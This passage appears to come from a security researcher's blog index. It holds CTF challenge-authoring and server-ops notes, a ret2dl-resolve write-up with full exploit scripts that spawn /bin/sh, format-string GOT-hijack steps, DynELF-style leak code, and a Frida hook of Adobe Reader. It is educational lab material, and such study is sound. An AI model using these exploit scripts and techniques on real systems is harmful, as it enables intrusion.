0x03:参考链接0byjwzsf","link":"/2016/08/14/pwnable-kr-alloca/"},{"title":"pwnhub杯CUIT第十三届校赛pwn出题及运维心得","text":"0x00: 前言​ 这次应该是我参与的第三次校赛了，第一次大一的时候是参赛者，和柠檬、K1n9还有管理小姐姐组队；后面两次都是以出题者身份参与，在出题中学习到了很多。第一次出题的时候太naive…也没参与运维，都是学长在做配置、维护，这次自己上阵，虽然准备了不少，但是还是有很多问题暴露出来。 ​ 这次文章涉及出题心得，出题中的一些思考、反思；运维中的一些问题，以及对问题的解决和以后的预防方案。 0x01:出题心得1. pwn50 python jail​ 这是一个python jail，题目是根据一个以前的ctf改的，我过滤了一些函数、字符，熟悉一点python的同学就能容易绕过，使用getattr去做函数调用。算是一个送分题吧 233333。 2. pwn100 lemon water​ 本来pwn100是学弟的…后面出了点问题，他甩锅了TAT。 我就想着随便出一个吧，就放了这么一个format string的盲打。 ​ 这种题目的思路也很简单，先用%p，确定arch，然后再确定输入在stack的位置，这次这个题目是%6$，后面的就很简单了，dump出来bin file，然后确定got表，有了fmt这种任意地址读的，构造leak就可以拿system地址了，后面直接hijacking printf got，输入一个/bin/sh，就拿shell啦~ ​ 但是这种题目以后最好不要出，一是没什么意思，二是对服务器的资源消耗很严重，很容易gg。这是自己的问题，背锅背锅…这个题目出的不好TAT 不过顺手黑了一波lemon同学 233333 3. pwn200 file share​ 先说下这个题目的想法吧。开始是基友byg0ne写的一个file share，我拿来修改的，他那个程序是解析http的，有点类似server上运行一个python -m EasyHTTPServer 这种，wget去获取文件。 ​ 对于这样的一个程序怎么塞进去两个洞呢？我首先想到ngnix那个BROP，解析http的时候栈溢出，嗯…我可以写进去一个login功能，然后有这个漏洞。另外需要一个泄露，怎么做呢？之前看了长亭杨博士的三个漏洞搞定路由器，提到了snprintf的滥用导致heap info leak，我也加了进去。所以原本的题目是这样的…但是后来测试的时候发现，信息泄露可以正常玩，泄露了堆信息，然后根据offset 和一些泄露出来的信息，能确定libc base addr，提供libc.so，就能拿到需要的信息了。但是问题出在栈溢出部分，想增加一个crack canary，然后再让他dup改标准输入输出，然后ROP拿shell…死在crack canary了，一些不可显字符接收有问题-。- 就gg了 ​ deadline逼近，我就改了题目…一下子改简单了，我背锅…还造成多解情况。 ​ 修改后题目的原本设想：fmt 泄露程序加载地址，确定get flag函数地址，crack canary，然后覆盖返回地值拿到flag。但是socket这种！fork server的啊，不重启加载地址一样的啊，可以无限fmt leak的啊TAT 结果就是…一个fmt就可以撸了。。泄露完了直接fmt 日返回地值 ​ 这个题目如果按照原本思路可能更好一点。或者这个题目去掉get flag函数，给libc，可以让泄露完了之后通过offset拿到dup，改标准输入输出，然后ROP拿shell。 4. pwn300 notebook​ 常规的heap题目，很简单。塞进去了堆溢出、UAF、释放后的heap未清空。 ​ 利用的话，利用fastbin的去leak info，然后堆溢出hijacking 函数指针，UAF 调用释放后的块中的方法get shell。很常规的一道题目吧，感觉也没啥难度….师傅们秒的贼快。 5. pwn400 &amp;&amp; pwn500ox9a82学弟的题目，关注他的博客就好啦~他会写的很详细。 题目出的很有质量，heap玩出了花，但是代码量挺大的，可能有些地方没测试到，出漏了也是有可能的 23333 膜一发9a82大佬 XD 0x02:运维不运维不知道辛苦啊…配服务器的时候觉得自己简直是个智障一样。 选择使用socat还是xinetd 纠结再三使用了socat，其实都差不多，socat更简单一点。 1nohup socat TCP-LISTEN:50004,fork,reuseaddr EXEC:'/home/pwn400/pwn400' &gt; /dev/null 2&gt;&amp;1 &amp; 大概这样的吧，具体的其他需求可以看socat文档去修改。 权限问题 啥也别说了所有写权限都ban掉，命令也做好权限，最好只留下ls cd cat这三个。 还有就是，我开始忘记给.bashrc去掉w权限了，被joker师傅写了 1echo :p ;exit 0 我服务都没起来…一脸懵逼的问了他，后面改了改…师傅又给我上了一课TAT 还有就是pwn 服务相关文件最好加上chattr +a一下… 其他 fork bomb这个真是没想到…结果被joker师傅pwn50打进来，fork bomb搞崩了好几次…后面改了配置文件，限制用户启的进程数目，重启之后好了一点。但是这样有个问题就是，当socat 启动的进程到一定数目之后，到了设置的max值，就起不来进程啦，就要重启服务了，很麻烦。最好的办法是，题目里都写上alarm，但是问题是像pwn100那种，没法这么干…比较尴尬，写个crontab自动重启好了 流量 抓流量就是为了反作弊，事实证明这次抓流量帮了大忙。呵呵， 现在CTF风气这样，我能怎么办，我也很绝望，我就是要怼。 部署了tcpdump，写了crontab去抓流量，以小时为单位。 当然了，这种方案不是很好，而且这次题目没token，导致我后面分析流量类死了，一个包一个包的看。以后的话可以参考杭电explore师傅的黑域，流量抓的更全，直接存数据库里，方便check。 自动化啊自动化 一定要做好自动化，比如服务重启(比如那个pwn100)，写crontab自动重启，要不然好累啊，觉都睡不好。 0x03: 随便瞎bbCTF风气慢慢变得很差，拿这次pwn50我抓到的流量来说，有这几种情况： payload 几乎一样的 没有任何尝试直接使用关键函数去命令执行的 只是随便交互的，一点意义都没，但是那个ip又提交了flag，可能是学校原因吧出口ip一样。 那些提交时间间隔不到1min、3min的。 爱怎么搞怎么搞吧。 我不懂，那是个python的jail啊，你不尝试我过滤了哪些字符，哪些函数，怎么确定用getattr的？ 去买彩票吧同学，中了大奖记得分我 233333 0x04: 结束语​ 比赛还是办的没啥大的问题，也学到很多东西，知道自己很多不足，以后多学习。感谢师傅们的支持、包容和理解。比赛时间比较尴尬，对不住大家了，导致很多师傅没来玩，比较遗憾，我们的锅TAT ​ 还有就是通过比赛又认识了一波师傅，比如nonick这位，非常强以后多交流学习 -。- 又可以进步啦","link":"/2017/05/29/pwnhub%E6%9D%AFCUIT%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E6%A0%A1%E8%B5%9Bpwn%E5%87%BA%E9%A2%98%E5%8F%8A%E8%BF%90%E7%BB%B4%E5%BF%83%E5%BE%97/"},{"title":"yocto writeup","text":"之前学习ret 2 dl-resolve的时候的记录，第一次遇到这种类型的题目应该是joker师傅给CCTF出的题目，之后师傅给了我yocto这个题目，并给了我他的exp，我根据一些文章+师傅的exp搞定了这个题目的利用。 0x00:分析程序逻辑很简单。 123456789101112Input: 1111.2222.3333.4444 ebp-0xc #12 edx 2222 ebp-0x10 #16 ecx 3333 ebp-0x14 #20 eax 1111then...call exc(edx,eax) 0000| 0xbffff9dc --&gt; 0x8ae # 2222 0004| 0xbffff9e0 --&gt; 0x457 # 1111 0008| 0xbffff9e4 --&gt; 0x80495c9 (&quot;.3333.4444\\n&quot;) 0012| 0xbffff9e8 --&gt; 0x457 0016| 0xbffff9ec --&gt; 0xd05 0020| 0xbffff9f0 --&gt; 0x8ae 0x01:利用思路使用ret 2 dl-reslove技术，伪造reloc和dynsym和dynstr，然后控制返回地值为plt[0]并且设置好参数，使得程序去查找并调用的是system()函数，并执行我们设置的命令。 0x02:exp构造过程123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python2__author__ = \"muhe\"from zio import *args = ['./yocto']io = zio(args, timeout=100000)plt_addr = 0x080482a0 # objdump -s -j .plt yoctorel_plt_addr = 0x08048270 # objdump -s -j .rel.plt yoctodynsym_addr = 0x0804818c # objdump -s -j .dynsym yoctodynstr_addr = 0x080481fc # objdump -s -j .dynstr yoctobase_addr = 0x080495C0 # globatoi_got_plt = 0x08049548atoi_plt = 0x080482e0# fake reloc herefake_reloc_addr = base_addr + 16reloc_offset = fake_reloc_addr - rel_plt_addr# fake dynsym here#fake_dynsym_addr = base_addr + ?# fake dynstr here'''input: 1111.2222.3333 push eax 1111 push edx 2222 jmp ecx 3333call ecx(edx,eax)'''payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecxio.writeline(payload)raw_input('waiting for debugger attach...')io.interact() check没过，继续构造。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python2__author__ = \"muhe\"from zio import *args = ['./yocto']io = zio(args, timeout=100000)plt_addr = 0x080482a0 # objdump -s -j .plt yoctorel_plt_addr = 0x08048270 # objdump -s -j .rel.plt yoctodynsym_addr = 0x0804818c # objdump -s -j .dynsym yoctodynstr_addr = 0x080481fc # objdump -s -j .dynstr yoctobase_addr = 0x080495C0 # globatoi_got_plt = 0x08049548atoi_plt = 0x080482e0# fake reloc herefake_reloc_addr = base_addr + 36 # 0x80495e4reloc_offset = fake_reloc_addr - rel_plt_addr # 0x1374# fake dynsym herefake_dynsym_addr = base_addr + 60# const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];r_info = (fake_dynsym_addr - dynsym_addr) &lt;&lt; 8 | 0x7# fake dynstr herefake_dynstr_addr = bass_addr + 45 # 0x80495edst_name = fake_dynstr_addr - dynstr_addrbin_sh_addr = bass_addr + 76 # 0x804960c'''input: 1111.2222.3333 push eax 1111 push edx 2222 jmp ecx 3333call ecx(edx,eax)'''payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecxraw_input('waiting for debugger attach...')payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"payload += \"DDDD\"payload += \"EEEE\"payload += \"FFFF\"payload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += \"JJJJ\"payload += \"KKKK\"payload += \"LLLL\"payload += \"MMMM\"payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() 过了 1assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); 最低位是不是7的check。 变换exp继续调试 1234567891011121314151617181920212223242526272829....payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"#payload += \"DDDD\"#payload += \"EEEE\" # r_infopayload += l32(atoi_got_plt)payload += l32(r_info)payload += \"FFFF\"payload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += \"JJJJ\"payload += \"KKKK\"payload += \"LLLL\"payload += \"MMMM\"payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() 变换payload部分 12345678910111213141516171819202122232425262728payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"#payload += \"DDDD\"#payload += \"EEEE\" # r_infopayload += l32(atoi_got_plt)payload += l32(r_info)payload += \"FFFF\"payload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += \"JJJJ\" # fake_dynsym_addrpayload += \"KKKK\"payload += \"LLLL\"#payload += \"MMMM\"payload += l32(0)payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() 解决办法：正常调试这个过程，看看引起异常的部分在哪里。 st_name设置的问题，修改正确的位置，改变payload为如下，继续调试。 12345678910111213141516171819202122232425payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"payload += l32(atoi_got_plt) #fake_relocpayload += l32(r_info)payload += \"FFFF\" # fake_dynstr_addrpayload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += l32(st_name) # fake_dynsym_addrpayload += \"KKKK\"payload += \"LLLL\"payload += l32(0)payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() 这样修改之后发现:替换system过去，应该就可以找到system的地址了。 然而…一口老血要喷出来了 这是修改之后的payload 12345678910111213141516171819202122232425262728293031payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"\\x90\" * (36 - len(payload))print \"$1 --&gt; %d\" % (len(payload))payload += l32(atoi_got_plt) #fake_relocpayload += l32(r_info)payload += \"\\x90\"*(45 - len(payload)) # fake_dynstr_addr string: \"system\\x00\" herepayload += \"system\\x00\"print \"$2 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (60 - len(payload))payload += l32(st_name) # fake_dynsym_addrpayload += l32(0)payload += l32(0)payload += l32(0x12)print \"$3 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (80 - len(payload))io.writeline(payload)io.interact() 单步看看发生了什么吧…. 函数的参数如下: 12_dl_lookup_symbol_x (undef_name=0x80495ed &lt;glob+45&gt; \"system\", undef_map=undef_map@entry=0xb7779938, ref=ref@entry=0xbff81f38, symbol_scope=0xb7779af0, version=0xb7753c98, type_class=type_class@entry=0x1, flags=flags@entry=0x1, skip_map=skip_map@entry=0x0) 对比源码里这个函数的原型: 12result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,4444 version, ELF_RTYPE_CLASS_PLT, flags, NULL); 返回值是libc的基地址。 对比了下9k师傅的exp，应该是dynsym的伪造块没有做对齐…原因暂时没搞清楚，先加上对齐在说。 最终exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/env python2__author__ = \"muhe\"from zio import *args = ['./yocto']io = zio(args, timeout=100000)plt_addr = 0x080482a0 # objdump -s -j .plt yoctorel_plt_addr = 0x08048270 # objdump -s -j .rel.plt yoctodynsym_addr = 0x0804818c # objdump -s -j .dynsym yoctodynstr_addr = 0x080481fc # objdump -s -j .dynstr yoctobase_addr = 0x080495C0 # globatoi_got_plt = 0x08049548atoi_plt = 0x080482e0# fake reloc herefake_reloc_addr = base_addr + 36 # 0x80495e4reloc_offset = fake_reloc_addr - rel_plt_addr # 0x1374# fake dynsym herefake_dynsym_addr = base_addr + 60align_dynsym = 0x10 - ((fake_dynsym_addr-dynsym_addr) &amp; 0xF)fake_dynsym_addr += align_dynsym# const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];r_info = ((fake_dynsym_addr - dynsym_addr)/0x10)&lt;&lt; 8 | 0x7# fake dynstr herefake_dynstr_addr = base_addr + 45 # 0x80495edst_name = fake_dynstr_addr - dynstr_addr # 0x13f1#bin_sh_addr = base_addr + 76 # 0x804960c'''input: 1111.2222.3333 push eax 1111 push edx 2222 jmp ecx 3333call ecx(edx,eax)'''payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])#payload += \"AAAA\"#payload += \";cat ./flag\\x00\"payload += \";/bin/sh\\x00\"payload += \"\\x90\" * (36 - len(payload))print \"$1 --&gt; %d\" % (len(payload))payload += l32(atoi_got_plt) #fake_relocpayload += l32(r_info)payload += \"\\x90\"*(45 - len(payload)) # fake_dynstr_addr string: \"system\\x00\" herepayload += \"system\\x00\"print \"$2 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (60 - len(payload))payload += \"\\x90\" * align_dynsympayload += l32(st_name) # fake_dynsym_addrpayload += l32(0)payload += l32(0)payload += l32(0x12)print \"$3 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (80 - len(payload))io.writeline(payload)io.interact() 读文件的exp效果 起shell的效果 0x03:参考 9k师傅的exp bigtang师傅drops的文章 ELF如何摧毁圣诞 ——通过ELF动态装载机制进行漏洞利用 Phrack文章","link":"/2016/10/25/yocto-writeup/"},{"title":"一些环境配置遇到的坑(持续更新)","text":"主要是针对一些环境配置的小问题的记录 1. 启用了win10 的linux子系统后，修改默认终端为zsh按照以往的套路，使用chsh -s /bin/zsh或者直接修改/etc/password里的配置都是可以的，但是这种方法对win10的linux子系统并不生效，重启之后还是默认的bash。​ 解决办法: 在~/.bashrc中添加如下代码 123if [ -t 1 ];thenexec zshfi 就可以啦~ 2. ubuntu16.04安装docker遇到问题解决办法: 在/etc/apt/sources.list文件中添加 1deb http://cz.archive.ubuntu.com/ubuntu trusty main 然后 12$ sudo apt-get install libsystemd-journal0$ sudo apt-get install docker-engine 3. 使用docker来配置pwn服务环境说明 ubuntu 16.04 LTS 文件目录 Dockerfile source.list start.sh 1234567891011121314151617181920212223242526272829#muhe docker study! FROM ubuntu:14.04 MAINTAINER muhe &lt;o0xmuhe@gmail.com&gt; COPY ./sources.list /etc/apt/sources.listRUN apt-get update RUN apt-get -y dist-upgradeRUN apt-get install -y socat RUN useradd -m ctfCOPY ./bin/ /home/ctf/COPY ./start.sh /start.shRUN chmod +x /start.shRUN chown -R root:ctf /home/ctfRUN chmod -R 750 /home/ctfRUN chmod 740 /home/ctf/flagRUN cp -R /lib* /home/ctfRUN cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/binRUN cp /bin/sh /home/ctf/binRUN cp /bin/ls /home/ctf/binRUN cp /bin/cat /home/ctf/binWORKDIR /home/ctfCMD [\"/start.sh\"]EXPOSE 10001 12345678910111213141516171819deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse 123#!/bin/bashsocat TCP4-LISTEN:10001,reuseaddr,fork EXEC:/home/ctf/helloworld 最后使用docker build -t ubuntu/pwn .来构建镜像就可以了。 4. 在win10子系统上使用pwntoolswin10子系统+cmder配置好了之后省得开虚拟机了…用来搞pwn也很爽。今天发现一个问题，pwntools用process启动程序的时候，遇到如下问题： 1234567891011$ python exp.pyTraceback (most recent call last): File \"exp.py\", line 9, in &lt;module&gt; p = process('./jmper') File \"/usr/local/lib/python2.7/dist-packages/pwntools-3.6.0.dev0-py2.7.egg/pwnlib/tubes/process.py\", line 269, in __init__ stdin, stdout, stderr, master, slave = self._handles(*handles) File \"/usr/local/lib/python2.7/dist-packages/pwntools-3.6.0.dev0-py2.7.egg/pwnlib/tubes/process.py\", line 605, in _handles tty.setraw(master) File \"/usr/lib/python2.7/tty.py\", line 28, in setraw tcsetattr(fd, when, mode)termios.error: (22, 'Invalid argument') 解决办法： 12#p = process('./jmper')p = process('./jmper',raw=False) 4. gdb+qemu调试linux内核timeout1target remote localhost:1234 换成 1target remote :1234 5. keyutils 的依赖(ubuntu)12apt-cache policy libkeyutils-devsudo apt-get install libkeyutils-dev","link":"/2016/09/24/%E4%B8%80%E4%BA%9B%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"title":"代码审计培养计划","text":"0x00 : 为什么要搞这个因为我菜啊，而且我想学代码审计啊。 0x01 : 第一步先找点代码来读一读，学习一下，培养下代码阅读能力啥的。 脚本引擎 tiny js just a demo0 https://github.com/gfwilliams/tiny-js.git jerryscript ECMS 5.1 https://github.com/jerryscript-project/jerryscript.git Espruino (MPL v2.0) 给嵌入式设备用的，很小 MuJS (Affero GPL) 很小 demo类型 quad-wheel (MIT License) v7 (GPL v2.0) 准备先看tiny js，从最小的开始，后面看一个稍微大一点的 2 或者3 这样的。 文件格式类一些小型的格式解析库、软件 Xml : tinyXML / rapidxml PDF : mupdf / pdfium 0x02 : 已读 tiny-js 就是个demo js engine，支持的东西也很基本，就是解析到token序列，然后 case TOKEN，然后走不同的执行流，执行js code。","link":"/2018/10/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%B9%E5%85%BB%E8%AE%A1%E5%88%92/"},{"title":"what DynELF does basically","text":"0x00:一直很好奇DynELF是怎么去info leak的，在阅读完了老外的一篇文章后，自己也仿照这写了一个，顺便复习了下elf文件结构相关的知识。 0x01: Get elf base addr前提：假设现在已经有一个任意地址读的漏洞，可以写出一个leak函数供后面代码使用。 首先，我们需要从一个地址开始，先解析到elf base addr。 12345678910def get_elf_base(entry): entry = u64(entry) libc_base = entry &amp; 0xfffffffffffff000 while True: tmp = leak(libc_base,0x8) if tmp[0:4] == '\\x7fELF' break libc_base -= 0x1000 print '[+]Libc base : 0x%x' % (libc_base) return libc_base 0x02: find program header之后是找到程序头。 123456def findPhdr(addr): if bits == 32: e_phoff = u32(leak(addr+0x1c,0x4).ljust(4,'\\0')) else: e_phoff = u64(leak(addr+0x20,0x8).ljust(8,'\\0')) return e_phoff + addr 0x03: DYNAMIC Section有了之前的程序头，就可以根据elf文件结构，去找到DYNAMIC section了 1234567def findDynamic(Phaddr,elf_base): i = -56 p_type = 0 while p_type != 2: i += 56 p_type = u32(leak,(Phaddr+i,0x4)) return u64(leak(Phaddr+i+16,0x8)) + elf_base 0x04: DT_SYMTAB and DT_STRTAB根据上一步找到的DYNAMIC section，可以确定DT_STRTAB 和 DT_SYMTAB。 12345678910111213141516def findDynTable(DynamicAddr): # for DT_STRTAB -- 5 # for DT_SYMTAB -- 6 tmp_dyn = DynamicAddr dt_sym_addr = 0 dt_str_addr = 0 while True: garbage = u64(leak(tmp_dyn,0x8)) if garbage == 0x5: dt_str_addr = u64(leak(tmp_dyn+0x8,0x8)) elif garbage == 0x6: dt_sym_addr = u64(leak(tmp_dyn+0x8,0x8)) if dt_sym_addr and dt_str_addr: break tmp_dyn += 0x10 return (dt_sym_addr,dt_str_addr) 0x05: find symbol you want最后一步，查找目标函数。 12345678910def findSymbol(strtab,symtab,symbol,elf_base): tmp_sym = symtab while True: garbage = u32(leak(tmp_sym,0x4)) name = leak(strtab+garbage,len(symbol)) if name == symbol: break tmp_sym += 0x18 symbol_addr = u64(leak(tmp_sym+0x8,0x8)) + elf_base return symbol_addr 0x06: Test最后看一下效果 1234567891011121314# muhe @ ubuntu in ~/Desktop/leak_study [20:58:04] $ python leak.py [+] Starting local process './pwn200': Done[+]Libc base : 0x7f95453ef000[+]Libc Program header addr : 0x7f95453ef040[+]Dynamic addr : 0x7f95457b1ba0[+]DT_SYMTAB_Addr 0x7f95453f2d80[+]DT_STRTAB_Addr 0x7f95453ffff8[+]System addr : 0x7f9545434390[*] Switching to interactive modeWelcome to RCTFAAAAAAAAAAAAAAAAAAAAAAAA\\x9@$ [*] Got EOF while reading in interactive 0x07:完整代码丢到了自己的pwnlog去了。说句题外话-。- 在看这篇Finding-Functions的时候，问了作者几个问题，作者都很快回复而且还给了不少其他的建议-。- 人真的很nice。 0x08: ReferenceFinding-Functions","link":"/2016/12/24/what-DynELF-does-basically/"},{"title":"使用Frida辅助逆向","text":"0x00 : 关于使用FridaFrida是一个跨平台的、多平台的hook框架，使用起来十分方便，而且文档全面，可以很好的辅助逆向工程。在需要使用一些hook的时候，可以很快地完成；如果还是用c/c++的话..写dll，还要想办法dll注入，而且很麻烦不灵活，修改代码很麻烦。 最近的工作中，我做了很多逆向的工作，虽然有部分工作暂时看不到什么收益，算是白折腾浪费了两周，但是这段时间熟悉了pykd，windbg script，frida，IDA Python的编写…也搞了一些方便日后修改使用的模板，算是有一点点收获吧，不过浪费了时间还是很难过。 0x01 : HOOK需求我需要去追一些内存分配、有些可能还需要操作一下，方便我的逆向工作顺利进行。 我这里以Adobe Reader 为例子，我hook了reader自己封装的内存分配函数，并且显示分配得到的内存；其他的需求都差不多，直接改模板就行，我是用的官方的模板修改的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from __future__ import print_functionimport fridaimport sysdef on_message(message, data): print(&quot;[%s] =&gt; %s&quot; % (message, data))def main(target_process): session = frida.attach(target_process) script = session.create_script(&quot;&quot;&quot; var baseAddr = Module.findBaseAddress('AcroRd32.dll'); console.log('AcroRd32.dll baseAddr: ' + baseAddr); var CallocFunc = resolveAddress(baseAddr); var JP2KDecodeFilterObj; var size = 1; Interceptor.attach(CallocFunc, { onEnter: function (args) { //console.log('[+] Called CallocFunc' + CallocFunc); size = args[0]; //console.log('[+] ALLOC size : ' + size); }, onLeave: function (retval) { console.log('[+] Returned from CallocFunc: ' + retval); dumpAddr('ret buffer', retval, parseInt(size)); } }); function replaceMem(addr, size){ if (addr.isNull()) return; for(var idx = 0; idx &lt; size; idx++){ Memory.writeU8(addr.add(ptr(idx)), 0x41); } } function dumpAddr(info, addr, size) { if (addr.isNull()) return; console.log('Data dump ' + info + ' :'); var buf = Memory.readByteArray(addr, size); console.log(hexdump(buf, { offset: 0, length: size, header: true, ansi: true })); } function resolveAddress(addr) { var offset = ptr(offset_you_get) var result = baseAddr.add(offset); console.log('[+] CallocFunc addr=' + result); return result; } &quot;&quot;&quot;) script.on('message', on_message) script.load() print(&quot;[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.\\n\\n&quot;) sys.stdin.read() session.detach()if __name__ == '__main__': if len(sys.argv) != 2: print(&quot;Usage: %s &lt;process name or PID&gt;&quot; % __file__) sys.exit(1) try: target_process = int(sys.argv[1]) except ValueError: target_process = sys.argv[1] main(target_process) 代码还是比较简单的，py脚本，hook部分的代码是js写的，（又被逼着学了一下js，然而我觉得我的js写的有种c的味道…） 如果你仔细看被hook的进程的话，你会发现在hook发生地时候，Frida的dll会注入进去，然后就是传统的那种hook的方式了，只是框架帮你做了太多的事情，所以你只需要写好js就好了。 我截取部分运行时候输出： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505100000000 00 00 00 00 00 00 ......[+] Returned from CallocFunc: 0x348f6fb0Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 ...[+] Returned from CallocFunc: 0x32d20fd8Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 .........[+] Returned from CallocFunc: 0x2c3f0f90Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 ............[+] Returned from CallocFunc: 0x1b934fc8Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 .............[+] Returned from CallocFunc: 0x1bd8efb0Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 ...[+] Returned from CallocFunc: 0x35857f58Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000020 00 00 00 00 00 00 00 00 00 00 ..........[+] Returned from CallocFunc: 0x35b33fc8Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000030 00 .[+] Returned from CallocFunc: 0x1bd66f78Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000080 00 00 00 00 00 00 00 00 ........[+] Returned from CallocFunc: 0x1bd6eff8... 一些其他的想法，这个其实可以做简单的in memory fuzz了，循环call，然后换内存…当然这个想法很low了，n年前的东西了，而且这种的话cov很难处理。 要说问题，就是Frida读取本地文件的问题，我试了new File和frida-fs均以失败告终…如果有人知道怎么玩的话，还望不吝赐教 :) 0x02 : 其他在写这些东西的时候，请教了jmpews师傅很多问题，十分感谢！ jmpews师傅后面向我推荐了 detours + Xenos这种方式来做hook，精力有限，而且上手难度有点高，所以暂时只能放在to do list上了，不过还是很感谢～","link":"/2019/01/04/%E4%BD%BF%E7%94%A8Frida%E8%BE%85%E5%8A%A9%E9%80%86%E5%90%91/"},{"title":"初试winafl","text":"1. fuzz自己写的exe 2.fuzz自己写的dll搞一个接口程序去fuzz就可以了，但是效率贼低…有待解决。","link":"/2016/08/26/%E5%88%9D%E8%AF%95winafl/"},{"title":"拯救macOS High sierra的硬盘空间","text":"0x00 : 起因Mac一直开着time machine备份数据，一直没出啥问题。直到今天在工作的时候，原本clone的一个虚拟机有问题，我就删了，重新克隆。(没有快照真的尴尬了) 